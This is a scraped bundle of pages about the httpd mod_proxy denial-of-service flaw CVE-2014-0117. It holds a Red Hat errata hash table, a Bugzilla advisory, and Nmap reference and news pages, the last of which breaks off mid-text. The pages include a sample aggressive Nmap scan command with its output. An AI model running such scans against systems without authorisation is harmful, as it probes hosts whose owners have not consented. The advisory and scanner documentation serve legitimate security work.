## Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.4

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| x86\_64 | |
| httpd-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 1bad8efb7d3d87e8611acb3f0546c6a3436554bea1a5d84dae6f879e9881a61b |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-devel-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: b37c6332025b7519a399e1bab337a28e32b18e8411c5077ca66ee2d18f48939c |
| httpd-manual-2.4.6-18.el7\_0.noarch.rpm | SHA-256: b05eeedfe5487ca74ff5591414c9e077bd325851ebb1684207920fbd9bab8e1f |
| httpd-tools-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: cf03510d0261e99e5fac9ce5b809c910a428cdb11e4ea2e1e5fb6036d82d8383 |
| mod\_ldap-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 040a5e46000b109dc768443606b93fdb34d118380fa0f3ae6bf1a9869ee708e1 |
| mod\_proxy\_html-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 44178d38cfc6f0a127027e9df8320e27a3719151b918133a47ca97dce3811b50 |
| mod\_session-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: a0cd7007ad1fe43c82b152b0bfe44d73bf60a8898e133d1a782e69bc6476dea8 |
| mod\_ssl-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: fb1321b30c96df4c68de8eb267248c898d6f288196fae60e224aa2421e4c6a92 |

## Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.3

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| x86\_64 | |
| httpd-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 1bad8efb7d3d87e8611acb3f0546c6a3436554bea1a5d84dae6f879e9881a61b |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-devel-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: b37c6332025b7519a399e1bab337a28e32b18e8411c5077ca66ee2d18f48939c |
| httpd-manual-2.4.6-18.el7\_0.noarch.rpm | SHA-256: b05eeedfe5487ca74ff5591414c9e077bd325851ebb1684207920fbd9bab8e1f |
| httpd-tools-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: cf03510d0261e99e5fac9ce5b809c910a428cdb11e4ea2e1e5fb6036d82d8383 |
| mod\_ldap-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 040a5e46000b109dc768443606b93fdb34d118380fa0f3ae6bf1a9869ee708e1 |
| mod\_proxy\_html-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 44178d38cfc6f0a127027e9df8320e27a3719151b918133a47ca97dce3811b50 |
| mod\_session-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: a0cd7007ad1fe43c82b152b0bfe44d73bf60a8898e133d1a782e69bc6476dea8 |
| mod\_ssl-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: fb1321b30c96df4c68de8eb267248c898d6f288196fae60e224aa2421e4c6a92 |

## Red Hat Enterprise Linux Server - Extended Life Cycle Support for IBM Power, big endian 7

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| ppc64 | |
| httpd-2.4.6-18.el7\_0.ppc64.rpm | SHA-256: 8320d3fb754e68e5128f09d319deb5d7492818bb5ef603703ba94feb6af71a51 |
| httpd-debuginfo-2.4.6-18.el7\_0.ppc64.rpm | SHA-256: 8cbc8d857d6927527a809951f0f5de9a1bf4fe749fb79c81f31157d28a0b25d3 |
| httpd-debuginfo-2.4.6-18.el7\_0.ppc64.rpm | SHA-256: 8cbc8d857d6927527a809951f0f5de9a1bf4fe749fb79c81f31157d28a0b25d3 |
| httpd-devel-2.4.6-18.el7\_0.ppc64.rpm | SHA-256: bab54f324c2d3a6b1e2cd687600f61a4a1a793bfde6692b53133a9adb7766b4f |
| httpd-manual-2.4.6-18.el7\_0.noarch.rpm | SHA-256: b05eeedfe5487ca74ff5591414c9e077bd325851ebb1684207920fbd9bab8e1f |
| httpd-tools-2.4.6-18.el7\_0.ppc64.rpm | SHA-256: f49eae62c82e754b32d4b62ee3050cba763a2f26f640352d5e6d05d670392f42 |
| mod\_ldap-2.4.6-18.el7\_0.ppc64.rpm | SHA-256: 0314ae4d99726d52083208e1a7edcb1ac33655b5020dcf0be48cde52bc15cf04 |
| mod\_proxy\_html-2.4.6-18.el7\_0.ppc64.rpm | SHA-256: d1795123568348407e7cba54ee1bbaf41f1015fd5e8389fbd7cc6815ccf0f32e |
| mod\_session-2.4.6-18.el7\_0.ppc64.rpm | SHA-256: 072fadfa5621315e4b0c022077b761ed9675f0b67541706a6a73f5b05962ff7b |
| mod\_ssl-2.4.6-18.el7\_0.ppc64.rpm | SHA-256: d28427258b7edd7402674697b425e62d8a102e74c0d3620f107591f953781742 |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from nmap.org_b89a31d3_20250126_093434.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

* [Nmap Network Scanning](toc.html)
* Chapter 15. Nmap Reference Guide

[Prev](data-files-replacing-data-files.html)[Next](man-briefoptions.html)
# Chapter 15. Nmap Reference Guide

Table of Contents

* [Description](man.html#man-description)
* [Options Summary](man-briefoptions.html)
* [Target Specification](man-target-specification.html)
* [Host Discovery](man-host-discovery.html)
* [Port Scanning Basics](man-port-scanning-basics.html)
* [Port Scanning Techniques](man-port-scanning-techniques.html)
* [Port Specification and Scan Order](man-port-specification.html)
* [Service and Version Detection](man-version-detection.html)
* [OS Detection](man-os-detection.html)
* [Nmap Scripting Engine (NSE)](man-nse.html)
* [Timing and Performance](man-performance.html)
* [Firewall/IDS Evasion and Spoofing](man-bypass-firewalls-ids.html)
* [Output](man-output.html)
* [Miscellaneous Options](man-misc-options.html)
* [Runtime Interaction](man-runtime-interaction.html)
* [Examples](man-examples.html)
* [Nmap Book](man-book.html)
* [Bugs](man-bugs.html)
* [Authors](man-author.html)
* [Legal Notices](man-legal.html)
  + [Nmap Copyright and Licensing](man-legal.html#nmap-copyright)
  + [Creative Commons License for this Nmap Guide](man-legal.html#man-copyright)
  + [Source Code Availability and Community Contributions](man-legal.html#source-contrib)
  + [No Warranty](man-legal.html#no-warranty)
  + [Inappropriate Usage](man-legal.html#inappropriate-usage)
  + [Third-Party Software and Funding Notices](man-legal.html#third-party-soft)
  + [United States Export Control](man-legal.html#us-export)
## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.029s latency).
rDNS record for 74.207.244.221: li86-221.members.linode.com
Not shown: 995 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)
| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)
|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)
80/tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Go ahead and ScanMe!
646/tcp  filtered ldp
1720/tcp filtered H.323/Q.931
9929/tcp open     nping-echo  Nping echo
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.39
OS details: Linux 2.6.39
Network Distance: 11 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
[Cut first 10 hops for brevity]
11  17.65 ms li86-221.members.linode.com (74.207.244.221)

Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds

```

The newest version of Nmap can be obtained from
[`https://nmap.org`](https://nmap.org). The newest version of this man page
is available at [`https://nmap.org/book/man.html`](https://nmap.org/book/man.html).
It is also included as a chapter of [*Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning*](https://nmap.org/book/).

---

[Prev](data-files-replacing-data-files.html)Using Customized Data Files[Up](toc.html)Nmap Network Scanning[Home](toc.html)[Next](man-briefoptions.html)Options Summary

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from bugzilla.redhat.com_9617f1cc_20250125_143741.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1120599)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1120599)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1120599)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1120599

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1120599**](show_bug.cgi?id=1120599)
(CVE-2014-0117)
- [CVE-2014-0117](https://access.redhat.com/security/cve/CVE-2014-0117) httpd: mod\_proxy denial of service

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2014-0117 httpd: mod\_proxy denial of service

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2014-0117 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1120607](show_bug.cgi?id=1120607) [1120608](show_bug.cgi?id=1120608) [1120614](show_bug.cgi?id=1120614 "CLOSED ERRATA - CVE-2014-0231 CVE-2014-0118 CVE-2014-0117 CVE-2014-0226 CVE-2013-4352 httpd: various flaws [fedora-all]") [1120938](show_bug.cgi?id=1120938) [1121037](show_bug.cgi?id=1121037) [1121038](show_bug.cgi?id=1121038) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1120610](show_bug.cgi?id=1120610) [1120623](show_bug.cgi?id=1120623) | | TreeView+ | [depends on](buglist.cgi?bug_id=1120599&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1120599&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2014-07-17 09:08 UTC by Murray McAllister | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-17 06:22 UTC ([History](show_activity.cgi?id=1120599)) | | [CC List:](page.cgi?id=fields.html#cclist) | 34 users (show)  anmiller bdunne cdewolf dajohnso dandread darran.lofthouse fnasser gmccullo grocha huwang jason.greene jawilson jclere jdoyle jfrey jkaluza jorton jprause jrafanie jvlcek lgao mjc mmaslano myarboro obarenbo pahan pgier pslavice rmeggins rsvoboda vtunka webstack-team weli xlecauch | | Fixed In Version: | httpd 2.4.10 | | | Doc Type: | Bug Fix | | | Doc Text: | A denial of service flaw was found in the mod\_proxy httpd module. A remote attacker could send a specially crafted request to a server configured as a reverse proxy using a threaded Multi-Processing Modules (MPM) that would cause the httpd child process to crash. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2019-06-08 02:34:03 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2014:0921](https://access.redhat.com/errata/RHSA-2014%3A0921) | 0 | normal | SHIPPED\_LIVE | Important: httpd security update | 2014-07-23 14:00:19 UTC | | Red Hat Product Errata | [RHSA-2014:0922](https://access.redhat.com/errata/RHSA-2014%3A0922) | 0 | normal | SHIPPED\_LIVE | Important: httpd24-httpd security update | 2014-07-23 14:00:09 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1120599#c0)  Murray McAllister    2014-07-17 09:08:42 UTC  ``` The following flaw has been fixed in the Apache HTTP Server:  "A flaw was found in mod_proxy. A remote attacker could send a carefully crafted request to a server configured as a reverse proxy, and cause the child process to crash. This could lead to a denial of service against a threaded MPM."  External References:  <http://httpd.apache.org/security/vulnerabilities_24.html>   ```  [Comment 2](show_bug.cgi?id=1120599#c2)  Murray McAllister    2014-07-17 09:39:47 UTC  ```  Created httpd tracking bugs for this issue:  Affects: fedora-all [[bug 1120614](show_bug.cgi?id=1120614 "CLOSED ERRATA - CVE-2014-0231 CVE-2014-0118 CVE-2014-0117 CVE-2014-0226 CVE-2013-4352 httpd: various flaws [fedora-all]")]   ```  [Comment 6](show_bug.cgi?id=1120599#c6)  Vincent Danen    2014-07-18 13:16:25 UTC  ``` Statement:  This issue did not affect the versions of httpd as shipped with Red Hat Enterprise Linux 5 and 6, Red Hat JBoss Web Server, and Red Hat JBoss Enterprise Application Platform. These products include httpd 2.2, and only httpd versions 2.4.6 through 2.4.9 include the vulnerable code.   ```  [Comment 8](show_bug.cgi?id=1120599#c8)  Tomas Hoger    2014-07-23 07:03:26 UTC  ``` Upstream commit: <http://svn.apache.org/viewvc?view=revision&revision=1610674>  2.4 backport: <http://svn.apache.org/viewvc?view=revision&revision=1610737>   ```  [Comment 9](show_bug.cgi?id=1120599#c9)  errata-xmlrpc    2014-07-23 10:00:50 UTC  ``` This issue has been addressed in following products:    Red Hat Software Collections 1 for Red Hat Enterprise Linux 6   Red Hat Software Collections 1 for Red Hat Enterprise Linux 6.4 EUS   Red Hat Software Collections 1 for Red Hat Enterprise Linux 7  Via RHSA-2014:0922 <https://rhn.redhat.com/errata/RHSA-2014-0922.html>   ```  [Comment 10](show_bug.cgi?id=1120599#c10)  errata-xmlrpc    2014-07-23 10:01:37 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 7  Via RHSA-2014:0921 <https://rhn.redhat.com/errata/RHSA-2014-0921.html>   ```  [Comment 11](show_bug.cgi?id=1120599#c11)  Fedora Update System    2014-07-25 10:03:36 UTC  ``` httpd-2.4.10-1.fc20 has been pushed to the Fedora 20 stable repository.  If problems still persist, please make note of it in this bug report.   ```  [Comment 12](show_bug.cgi?id=1120599#c12)  Martin Prpič    2014-07-28 11:28:31 UTC  ``` IssueDescription:  A denial of service flaw was found in the mod_proxy httpd module. A remote attacker could send a specially crafted request to a server configured as a reverse proxy using a threaded Multi-Processing Modules (MPM) that would cause the httpd child process to crash.   ```  [Comment 13](show_bug.cgi?id=1120599#c13)  Fedora Update System    2014-08-15 02:47:02 UTC  ``` httpd-2.4.10-1.fc19 has been pushed to the Fedora 19 stable repository.  If problems still persist, please make note of it in this bug report.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1120599&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from lists.apache.org_ad504cfc_20250125_143744.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from lists.apache.org_aef3df22_20250125_143742.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from nmap.org_9ba698e9_20250126_093435.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project—a 5-gigapixel interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap 